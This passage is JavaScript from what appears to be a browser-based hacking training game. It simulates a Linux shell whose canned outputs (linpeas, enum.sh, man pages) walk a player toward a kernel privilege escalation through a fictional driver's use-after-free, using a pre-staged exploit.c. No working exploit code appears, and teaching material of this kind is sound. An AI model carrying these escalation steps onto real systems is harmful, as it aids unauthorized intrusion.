                '        inet6 fe80::a00:27ff:fe8d:c04d  prefixlen 64  scopeid 0x20<link>\n' +
                '        ether 08:00:27:8d:c0:4d  txqueuelen 1000  (Ethernet)\n\n' +
                'lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n' +
                '        inet 127.0.0.1  netmask 255.0.0.0\n' +
                '        inet6 ::1  prefixlen 128  scopeid 0x10<host>';
        },

        'ip': function(args, term, engine) {
            if (args[0] === 'a' || args[0] === 'addr') {
                return '1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 state UNKNOWN\n' +
                    '    inet 127.0.0.1/8 scope host lo\n' +
                    '2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 state UP\n' +
                    '    inet 10.10.14.5/24 brd 10.10.14.255 scope global eth0';
            }
            if (args[0] === 'route' || args[0] === 'r') {
                return 'default via 10.10.14.1 dev eth0 proto dhcp src 10.10.14.5 metric 100\n' +
                    '10.10.14.0/24 dev eth0 proto kernel scope link src 10.10.14.5';
            }
            return 'Usage: ip [addr|route|link]';
        },

        'ping': function(args, term, engine) {
            var target = args.find(function(a) { return !a.startsWith('-'); }) || '';
            if (!target) return 'Usage: ping [-c count] destination';
            return 'PING ' + target + ' (' + target + ') 56(84) bytes of data.\n' +
                '64 bytes from ' + target + ': icmp_seq=1 ttl=64 time=0.021 ms\n' +
                '64 bytes from ' + target + ': icmp_seq=2 ttl=64 time=0.024 ms\n\n' +
                '--- ' + target + ' ping statistics ---\n' +
                '2 packets transmitted, 2 received, 0% packet loss';
        },

        // ── Process commands ───────────────────────────────

        'ps': function(args, term, engine) {
            var joined = args.join(' ');
            if (joined.match(/aux/) || joined.match(/-ef/)) {
                var procs = 'USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n' +
                    'root         1  0.0  0.1 169204 13168 ?        Ss   Dec09   0:12 /sbin/init\n' +
                    'root       312  0.0  0.0  99864  6884 ?        Ss   Dec09   0:01 /lib/systemd/systemd-journald\n' +
                    'root       345  0.0  0.0  24068  5640 ?        Ss   Dec09   0:00 /lib/systemd/systemd-udevd\n' +
                    'root       452  0.0  0.0  15428  7128 ?        Ss   Dec09   0:03 sshd: /usr/sbin/sshd -D\n' +
                    'root       520  0.0  0.0   8536  3040 ?        Ss   Dec09   0:00 /usr/sbin/cron -f\n';
                if (A19Config._state.rootObtained) {
                    procs += 'root      5103 0.0  0.0   8960  5340 pts/0    Ss   08:30   0:00 -bash\n';
                } else {
                    procs += 'foundat+  5103 0.0  0.0   8960  5340 pts/0    Ss   08:30   0:00 -bash\n';
                }
                procs += 'foundat+  5201 0.0  0.0  10068  3428 pts/0    R+   08:30   0:00 ps aux';
                return procs;
            }
            return 'PID TTY          TIME CMD\n' +
                '5103 pts/0    00:00:00 bash\n' +
                '5201 pts/0    00:00:00 ps';
        },

        'top': function(args, term, engine) {
            return 'top - 08:30:22 up 3 days,  0:14,  1 user,  load average: 0.02, 0.01, 0.00\n' +
                'Tasks:  98 total,   1 running,  97 sleeping,   0 stopped,   0 zombie\n' +
                '%Cpu(s):  0.5 us,  0.3 sy,  0.0 ni, 99.0 id,  0.2 wa,  0.0 hi,  0.0 si\n' +
                'MiB Mem :  32768.0 total,  28934.2 free,   1892.4 used,   1941.4 buff/cache\n' +
                'MiB Swap:   2048.0 total,   2048.0 free,      0.0 used.  30487.8 avail Mem\n\n' +
                '    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n' +
                '      1 root      20   0  169204  13168   8432 S   0.0  0.0   0:12.45 systemd\n' +
                '    452 root      20   0   15428   7128   6408 S   0.0  0.0   0:03.21 sshd\n' +
                '    520 root      20   0    8536   3040   2708 S   0.0  0.0   0:00.14 cron\n\n' +
                '(press q to exit)';
        },

        // ── System info commands ───────────────────────────

        'lsb_release': function(args, term, engine) {
            return 'Distributor ID: Ubuntu\n' +
                'Description:    Ubuntu 20.04.1 LTS\n' +
                'Release:        20.04\n' +
                'Codename:       focal';
        },

        'df': function(args, term, engine) {
            return 'Filesystem      Size  Used Avail Use% Mounted on\n' +
                '/dev/sda1       1.0T  312G  656G  33% /\n' +
                'tmpfs           15.9G     0  15.9G   0% /dev/shm\n' +
                'tmpfs            3.2G  1.1M   3.2G   1% /run\n' +
                'tmpfs            5.0M     0   5.0M   0% /run/lock\n' +
                '/dev/sda15      105M  6.1M   99M   6% /boot/efi';
        },

        'free': function(args, term, engine) {
            return '               total        used        free      shared  buff/cache   available\n' +
                'Mem:        33554432     1938432    29614080       16384     2001920    31213056\n' +
                'Swap:        2097152           0     2097152';
        },

        'uptime': function(args, term, engine) {
            return ' 08:30:22 up 3 days,  0:14,  1 user,  load average: 0.02, 0.01, 0.00';
        },

        'date': function(args, term, engine) {
            return 'Sat Dec 12 08:30:22 UTC 2020';
        },

        'env': function(args, term, engine) {
            return 'SHELL=/bin/bash\n' +
                'PWD=' + (term.cwd || '/home/foundation_dev') + '\n' +
                'LOGNAME=' + (A19Config._state.rootObtained ? 'root' : 'foundation_dev') + '\n' +
                'HOME=' + (A19Config._state.rootObtained ? '/root' : '/home/foundation_dev') + '\n' +
                'LANG=en_US.UTF-8\n' +
                'USER=' + (A19Config._state.rootObtained ? 'root' : 'foundation_dev') + '\n' +
                'TERM=xterm-256color\n' +
                'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n' +
                'HOSTNAME=citadel-core\n' +
                'SSH_CONNECTION=10.10.14.20 52441 10.10.14.5 22';
        },

        'printenv': function(args, term, engine) {
            return A19Config.commands['env'](args, term, engine);
        },

        // ── bash script runner for enum.sh ─────────────────

        'bash': function(args, term, engine) {
            if (args[0] === 'enum.sh' || args[0] === './enum.sh') {
                return '======================================\n' +
                    '  Foundation Enumeration Script v1.0\n' +
                    '======================================\n\n' +
                    '[*] Current User:\nfoundation_dev\nuid=1001(foundation_dev) gid=1001(foundation_dev) groups=1001(foundation_dev)\n\n' +
                    '[*] Kernel Version:\nLinux citadel-core 5.4.0-58-generic #64-Ubuntu SMP x86_64 GNU/Linux\n\n' +
                    '[*] OS Release:\nPRETTY_NAME="Ubuntu 20.04.1 LTS"\nNAME="Ubuntu"\nVERSION_ID="20.04"\nVERSION="20.04.1 LTS (Focal Fossa)"\nVERSION_CODENAME=focal\n\n' +
                    '[*] Loaded Kernel Modules:\nModule                  Size  Used by\nfoundation_drv         16384  0\next4                  745472  1\n...\n\n' +
                    '[*] SUID Binaries:\n/usr/bin/chfn\n/usr/bin/chsh\n/usr/bin/gpasswd\n/usr/bin/mount\n/usr/bin/newgrp\n/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/umount\n\n' +
                    '[*] Sudo Permissions:\nSorry, user foundation_dev may not run sudo on citadel-core.\n\n' +
                    '[*] Compiler available:\n/usr/bin/gcc\ngcc (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0\n\n' +
                    '[*] /dev entries (custom devices):\ncrw-rw---- 1 root foundation 243, 0 Dec  9 08:16 /dev/foundation_drv\n\n' +
                    '[+] Enumeration complete.';
            }
            return 'bash: already in a bash shell. Use exit to leave.';
        },

        './enum.sh': function(args, term, engine) {
            return A19Config.commands['bash'](['./enum.sh'], term, engine);
        },

        'sh': function(args, term, engine) {
            if (args[0] === 'enum.sh' || args[0] === './enum.sh') {
                return A19Config.commands['bash'](['./enum.sh'], term, engine);
            }
            return 'sh: already in a shell.';
        },

        // ── linpeas — automated enumeration ────────────────

        'linpeas': function(args, term, engine) {
            return '\x1b[33m' +
                '                      ╔══════════════════════════════╗\n' +
                '              ════════╣ LinPEAS — Linux Privesc       ╠════════\n' +
                '                      ╚══════════════════════════════╝\n\n' +
                '\x1b[0m' +
                '\x1b[34m[*] System Information\x1b[0m\n' +
                '  OS: Ubuntu 20.04.1 LTS (Focal Fossa)\n' +
                '  Kernel: 5.4.0-58-generic\n' +
                '  Hostname: citadel-core\n' +
                '  Current user: foundation_dev\n\n' +
                '\x1b[34m[*] Kernel Hardening\x1b[0m\n' +
                '  kernel.dmesg_restrict = 1 (dmesg blocked for non-root)\n' +
                '  kernel.yama.ptrace_scope = 2 (ptrace blocked for non-root)\n' +
                '  kernel.kptr_restrict = 1 (kernel pointers hidden)\n' +
                '  kernel.randomize_va_space = 2 (full ASLR enabled)\n\n' +
                '\x1b[34m[*] Sudo permissions\x1b[0m\n' +
                '  foundation_dev may NOT run sudo on citadel-core\n\n' +
                '\x1b[34m[*] SUID binaries (non-standard)\x1b[0m\n' +
                '  No custom SUID binaries found — all standard system bins.\n\n' +
                '\x1b[31m[!] Loaded Kernel Modules (INTERESTING)\x1b[0m\n' +
                '  \x1b[31mfoundation_drv         16384  0 — CUSTOM MODULE!\x1b[0m\n' +
                '  Device: /dev/foundation_drv (crw-rw---- root:foundation)\n' +
                '  Version: 1.0.3 (Proprietary — Citadel Foundation IPC Driver)\n' +
                '  \x1b[33m>>> strings shows "TODO: fix refcount race in free path" <<<\x1b[0m\n' +
                '  \x1b[33m>>> Use-after-free warnings in syslog for this module <<<\x1b[0m\n\n' +
                '\x1b[31m[!] Kernel version 5.4.0-58 — KNOWN VULNERABLE\x1b[0m\n' +
                '  Multiple local privilege escalation CVEs affect this kernel.\n' +
                '  \x1b[33m>>> Try: searchsploit 5.4.0 <<<\x1b[0m\n\n' +
                '\x1b[34m[*] Compiler available\x1b[0m\n' +
                '  gcc 9.3.0 — can compile kernel exploits on target\n\n' +
                '\x1b[34m[*] Network services\x1b[0m\n' +
                '  0.0.0.0:22   (sshd)\n\n' +
                '\x1b[32m[+] Possible escalation vectors: 1 high-confidence\x1b[0m\n' +
                '  1. \x1b[31mKernel exploit via foundation_drv UAF\x1b[0m\n' +
                '     - Custom module with known bugs in ioctl handler\n' +
                '     - Pre-staged exploit code in ~/exploit.c\n' +
                '     - Compile with gcc and execute';
        },

        'linpeas.sh': function(args, term, engine) {
            return A19Config.commands['linpeas'](args, term, engine);
        },

        './linpeas.sh': function(args, term, engine) {
            return A19Config.commands['linpeas'](args, term, engine);
        },

        // ── which — binary lookup ──────────────────────────

        'which': function(args, term, engine) {
            var bins = {
                'gcc': '/usr/bin/gcc',
                'make': '/usr/bin/make',
                'bash': '/usr/bin/bash',
                'sh': '/usr/bin/sh',
                'cat': '/usr/bin/cat',
                'ls': '/usr/bin/ls',
                'find': '/usr/bin/find',
                'grep': '/usr/bin/grep',
                'strings': '/usr/bin/strings',
                'chmod': '/usr/bin/chmod',
                'echo': '/usr/bin/echo',
                'wget': '/usr/bin/wget',
                'curl': '/usr/bin/curl',
                'python3': '/usr/bin/python3',
                'sudo': '/usr/bin/sudo',
                'ssh': '/usr/bin/ssh',
                'lsmod': '/usr/sbin/lsmod',
                'modinfo': '/usr/sbin/modinfo',
                'uname': '/usr/bin/uname',
                'searchsploit': '/usr/bin/searchsploit',
                'sysctl': '/usr/sbin/sysctl',
                'dmesg': '/usr/bin/dmesg'
            };
            var cmd = args[0] || '';
            return bins[cmd] || cmd + ' not found';
        },

        'type': function(args, term, engine) {
            var cmd = args[0] || '';
            if (!cmd) return 'type: usage: type name';
            if (A19Config.commands[cmd]) return cmd + ' is a shell builtin or available command';
            return 'bash: type: ' + cmd + ': not found';
        },

        // ── chmod — file permissions ───────────────────────

        'chmod': function(args, term, engine) {
            var joined = args.join(' ');
            if (joined.match(/\+x\s+.*enum\.sh/) || joined.match(/755\s+.*enum\.sh/)) {
                return '';
            }
            if (joined.match(/\+x\s+.*exploit/) || joined.match(/755\s+.*exploit/)) {
                return '';
            }
            return '';
        },

        // ── echo — general use ─────────────────────────────

        'echo': function(args, term, engine) {
            var joined = args.join(' ');
            // Writing to /tmp
            if (joined.match(/>>?\s*\/tmp\//)) {
                return '';
            }
            // Normal echo
            var output = joined.replace(/>>?.*$/, '').trim();
            output = output.replace(/^['"]|['"]$/g, '');
            return output;
        },

        // ── wget / curl — limited connectivity ─────────────

        'wget': function(args, term, engine) {
            var url = args.find(function(a) { return !a.startsWith('-'); }) || '';
            if (url.match(/linpeas/)) {
                return '[*] Simulated download: linpeas.sh\n[*] File saved to current directory.\nTip: Run linpeas directly — it\'s available as a command.';
            }
            if (!url) return 'Usage: wget <url>';
            return 'Connecting to ' + url + '... failed: Connection timed out.\n(Isolated target — limited outbound access)';
        },

        'curl': function(args, term, engine) {
            var url = args.find(function(a) { return !a.startsWith('-') && a.startsWith('http'); }) || '';
            if (!url && !args.length) return 'curl: try \'curl --help\' for more information';
            return 'curl: (7) Failed to connect: Connection timed out\n(Isolated target — limited outbound access)';
        },

        // ── systemctl — service info ───────────────────────

        'systemctl': function(args, term, engine) {
            if (args[0] === 'status') {
                var service = args[1] || '';
                if (service.match(/ssh/)) {
                    return 'ssh.service - OpenBSD Secure Shell server\n' +
                        '     Loaded: loaded (/lib/systemd/system/ssh.service; enabled)\n' +
                        '     Active: active (running)\n' +
                        '   Main PID: 452 (sshd)';
                }
                if (service.match(/cron/)) {
                    return 'cron.service - Regular background program processing daemon\n' +
                        '     Loaded: loaded (/lib/systemd/system/cron.service; enabled)\n' +
                        '     Active: active (running)\n' +
                        '   Main PID: 520 (cron)';
                }
                return 'Unit ' + service + ' could not be found.';
            }
            return 'Usage: systemctl status <service>';
        },

        // ── Misc utilities ─────────────────────────────────

        'wc': function(args, term, engine) {
            var files = args.filter(function(a) { return !a.startsWith('-'); });
            if (!files.length) return 'Usage: wc [OPTION]... [FILE]...';
            var results = [];
            for (var i = 0; i < files.length; i++) {
                var content = A19Config._readFsFile(files[i]);
                if (content === null) { results.push('wc: ' + files[i] + ': No such file or directory'); continue; }
                if (content === '__dir__') { results.push('wc: ' + files[i] + ': Is a directory'); continue; }
                var lines = content.split('\n').length;
                var words = content.split(/\s+/).filter(Boolean).length;
                var chars = content.length;
                results.push('  ' + lines + '  ' + words + ' ' + chars + ' ' + files[i]);
            }
            return results.join('\n');
        },

        'touch': function(args, term, engine) {
            return '';
        },

        'mkdir': function(args, term, engine) {
            var dir = args.find(function(a) { return !a.startsWith('-'); });
            if (dir && dir.startsWith('/tmp')) return '';
            if (dir && dir.startsWith('/home/foundation_dev')) return '';
            return 'mkdir: cannot create directory \'' + (dir || '') + '\': Permission denied';
        },

        'pwd': function(args, term, engine) {
            return term.cwd || '/home/foundation_dev';
        },

        'cd': function(args, term, engine) {
            var target = args[0] || '/home/foundation_dev';
            if (target === '~') target = '/home/foundation_dev';
            if (target.startsWith('~/')) target = '/home/foundation_dev' + target.slice(1);

            // Permission check
            if (target.match(/^\/root/) && !A19Config._state.rootObtained) {
                return 'bash: cd: /root: Permission denied';
            }

            // Resolve path
            var resolved = target;
            if (!target.startsWith('/')) {
                resolved = (term.cwd || '/home/foundation_dev') + '/' + target;
            }
            var parts = resolved.split('/').filter(Boolean);
            var norm = [];
            for (var i = 0; i < parts.length; i++) {
                if (parts[i] === '.') continue;
                if (parts[i] === '..') { norm.pop(); continue; }
                norm.push(parts[i]);
            }
            resolved = '/' + norm.join('/');

            var node = A19Config._getNode(resolved);
            if (!node) return 'bash: cd: ' + target + ': No such file or directory';
            if (node.type !== 'dir') return 'bash: cd: ' + target + ': Not a directory';

            term.cwd = resolved;
            term._updatePrompt();
            return '';
        },

        // ── strace — kernel debugging (restricted) ────────

        'strace': function(args, term, engine) {
            if (args.length === 0) return 'Usage: strace <command>';
            return 'strace: test_ptrace_get_id: Operation not permitted\n\n' +
                '[note] kernel.yama.ptrace_scope = 2 restricts ptrace to root only.\n' +
                'You cannot trace processes as foundation_dev.';
        },

        'gdb': function(args, term, engine) {
            if (args.length === 0) return 'Usage: gdb <program>';
            return 'GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2\n' +
                'ptrace: Operation not permitted.\n\n' +
                '[note] kernel.yama.ptrace_scope = 2 — ptrace restricted to root.\n' +
                'Consider the kernel exploit approach instead.';
        },

        // ── man pages ──────────────────────────────────────

        'man': function(args, term, engine) {
            var page = args[0] || '';
            if (page === 'foundation_drv') {
                return 'FOUNDATION_DRV(4)  — Citadel Foundation IPC Driver\n\n' +
                    'NAME\n       foundation_drv - Citadel Foundation inter-process communication driver\n\n' +
                    'DESCRIPTION\n       Character device driver providing shared memory IPC buffers.\n' +
                    '       Device node: /dev/foundation_drv\n\n' +
                    'IOCTL COMMANDS\n       IOCTL_ALLOC (0x40)  — Allocate a new IPC buffer slot\n' +
                    '       IOCTL_FREE  (0x41)  — Free an existing buffer slot\n' +
                    '       IOCTL_WRITE (0x42)  — Write data to allocated buffer\n\n' +
                    'BUGS\n       The IOCTL_FREE handler does not invalidate the internal pointer\n' +
                    '       after freeing the buffer. A subsequent IOCTL_WRITE may access\n' +
                    '       freed memory. Engineering has classified this as "non-exploitable."\n\n' +
                    'SEE ALSO\n       ioctl(2), mmap(2)';
            }
            if (page === 'gcc') {
                return 'GCC(1)\n\nNAME\n       gcc - GNU project C compiler\n\nSYNOPSIS\n       gcc [-o output] [-Wall] [-g] file.c\n\nDESCRIPTION\n       Compile C source code into executable binary.';
            }
            if (page === 'lsmod') {
                return 'LSMOD(8)\n\nNAME\n       lsmod - Show the status of modules in the Linux kernel\n\nDESCRIPTION\n       Lists currently loaded kernel modules from /proc/modules.';
            }
            if (!page) return 'What manual page do you want?\nFor example, try \'man foundation_drv\', \'man gcc\', or \'man lsmod\'.';
            return 'No manual entry for ' + page;
        },

        // ── vi/vim/nano — not interactive ──────────────────

        'vi': function(args, term, engine) {
            var file = args[0] || '';
            if (file.match(/exploit\.c/)) {
                return '(Interactive editors not supported in simulation)\nTip: Use cat exploit.c to view the source.\nThe exploit is ready to compile: gcc -o exploit exploit.c';
            }
            return '(Interactive editors not supported in simulation)\nTip: Use cat to read files, echo to write.';
        },

        'vim': function(args, term, engine) {
            return A19Config.commands['vi'](args, term, engine);
        },

        'nano': function(args, term, engine) {
            return A19Config.commands['vi'](args, term, engine);
        },

        // ── python — limited ───────────────────────────────

        'python3': function(args, term, engine) {
            if (args[0] === '-c') {
                return 'Python 3.8.10 — restricted execution in simulation';
            }
            return 'Python 3.8.10\n>>> (interactive mode not supported in simulation)';
        },

        'python': function(args, term, engine) {
            return A19Config.commands['python3'](args, term, engine);
        },

        // ── ssh — already on target ────────────────────────

        'ssh': function(args, term, engine) {
            return 'You are already logged into citadel-core as foundation_dev.\nFocus on local privilege escalation via kernel exploitation.';
        },

        // ── history ────────────────────────────────────────

        'history': function(args, term, engine) {
            var lines = term.history.map(function(cmd, i) {
                return '  ' + String(i + 1).padStart(4) + '  ' + cmd;
            });
            return lines.join('\n');
        },

        // ── less — file viewer ─────────────────────────────

        'less': function(args, term, engine) {
            var file = args[0] || '';
            if (!file) return 'Usage: less <file>';
            if (file.match(/^\/root\//) && !A19Config._state.rootObtained) {
                return 'less: ' + file + ': Permission denied';
            }
            var content = A19Config._readFsFile(file);
            if (content === null) return 'less: ' + file + ': No such file or directory';
            return content;
        },

        // ── crontab ────────────────────────────────────────

        'crontab': function(args, term, engine) {
            if (args[0] === '-l') {
                return 'no crontab for foundation_dev';
            }
            return 'Usage: crontab [-l]';
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM HELPERS
    // ═══════════════════════════════════════════════════════

    _getNode(path) {
        if (!path.startsWith('/')) {
            path = '/home/foundation_dev/' + path;
        }
        var parts = path.split('/').filter(Boolean);
        var resolved = [];
        for (var i = 0; i < parts.length; i++) {
            if (parts[i] === '.') continue;
            if (parts[i] === '..') { resolved.pop(); continue; }
            resolved.push(parts[i]);
        }

        var node = A19Config.filesystem['/'];
        for (var j = 0; j < resolved.length; j++) {
            if (!node || node.type !== 'dir' || !node.children || !node.children[resolved[j]]) {
                return null;
            }
            node = node.children[resolved[j]];
        }
        return node;
    },

    _readFsFile(path) {
        var node = A19Config._getNode(path);
        if (!node) return null;
        if (node.type === 'dir') return '__dir__';
        return node.content || '';
    },

    _findFiles(startPath, pattern) {
        var results = [];
        var regexStr = '^' + pattern.replace(/\*/g, '.*').replace(/\?/g, '.') + '$';
        var regex = new RegExp(regexStr);

        var walk = function(path, node) {
            if (!node) return;
            var name = path.split('/').pop() || '/';
            if (regex.test(name)) {
                results.push(path);
            }
            if (node.type === 'dir' && node.children) {
                var entries = Object.keys(node.children);
                for (var i = 0; i < entries.length; i++) {
                    var childPath = path === '/' ? '/' + entries[i] : path + '/' + entries[i];
                    walk(childPath, node.children[entries[i]]);
                }
            }
        };

        var startNode = A19Config._getNode(startPath);
        if (startNode) walk(startPath, startNode);
        return results;
    },

    // ═══════════════════════════════════════════════════════
    // HTML HELPERS
    // ═══════════════════════════════════════════════════════

    _escHtml(str) {
        var div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    },

    _stripHtml(html) {
        var tmp = document.createElement('div');
        tmp.innerHTML = html;
        return tmp.textContent.trim();
    }

};
